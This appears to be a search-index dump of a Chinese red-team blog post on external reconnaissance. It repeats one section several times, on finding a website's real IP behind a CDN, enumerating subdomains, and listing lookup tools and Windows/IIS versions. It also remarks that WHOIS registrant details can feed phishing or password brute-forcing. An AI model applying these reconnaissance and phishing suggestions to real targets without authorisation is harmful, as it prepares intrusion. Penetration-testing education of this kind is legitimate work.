域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#1-多地ping"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#2-nslookup"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#3-dns-历史查询"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#4查找子域名"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#5-反向连接"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 